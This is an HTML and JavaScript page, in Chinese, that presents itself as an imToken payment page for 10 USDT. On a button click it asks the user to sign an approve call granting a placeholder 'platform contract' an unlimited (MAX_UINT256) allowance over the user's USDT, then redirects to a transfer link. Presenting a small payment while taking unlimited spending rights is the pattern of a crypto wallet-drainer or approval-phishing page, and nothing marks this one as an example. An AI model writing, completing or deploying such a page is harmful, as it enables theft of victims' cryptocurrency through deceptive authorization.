<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>imToken 授权支付</title>
</head>
<body>
  <h2>使用 imToken 授权并支付 USDT</h2>
  <p id="status">状态：等待用户操作</p>
  <button id="payBtn" onclick="authorizeAndPay()" disabled>授权并支付</button>

  <script>
    const userAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; // 钱包地址
    const spender = "0xYourSmartContractAddress"; // 你的平台合约地址
    const tokenContract = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC20 合约地址
    const tokenSymbol = "USDT";
    const amount = "10"; // 支付金额
    const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // MAX_UINT256

    // 检测 imToken 环境
    document.addEventListener("DOMContentLoaded", () => {
      if (typeof window.imToken !== "undefined") {
        document.getElementById("status").innerText = "imToken 已就绪";
        document.getElementById("payBtn").disabled = false;
      } else if (!window.location.hash.includes("from=imtoken")) {
        document.getElementById("status").innerText = "尝试拉起 imToken 中打开...";
        const dappUrl = encodeURIComponent(window.location.href + "#from=imtoken");
        const openUrl = `imtokenv2://navigate/DappView?url=${dappUrl}`;
        window.location.href = openUrl;
      } else {
        document.getElementById("status").innerText = "请在 imToken 中打开以继续授权支付";
      }
    });

    async function authorizeAndPay() {
      if (typeof window.imToken === "undefined") {
        alert("请在 imToken App 中打开本页面");
        return;
      }

      document.getElementById("status").innerText = "状态：正在发起授权，请签名...";
      try {
        const result = await window.imToken.callAPI("native.account.request", {
          contractAddress: tokenContract,
          functionName: "approve",
          functionParams: [spender, approveAmount],
          message: "请授权平台合约代扣 USDT"
        });

        const txHash = result.txHash;
        document.getElementById("status").innerText = `授权成功，交易哈希：${txHash}`;
        console.log("授权成功:", txHash);

        // 可选：这里可以先 check txHash 是否确认成功

        setTimeout(() => {
          payWithImToken(txHash);
        }, 1500);
      } catch (error) {
        console.error("授权失败:", error);
        alert("授权失败，请检查钱包或网络");
        document.getElementById("status").innerText = "授权失败";
      }
    }

    function payWithImToken(txHash) {
      const payUrl = `imtoken://transfer?contract=${tokenSymbol}&to=${userAddress}&value=${amount}&txHash=${txHash}`;
      console.log("跳转支付链接:", payUrl);
      window.location.href = payUrl;
    }
  </script>
</body>
</html>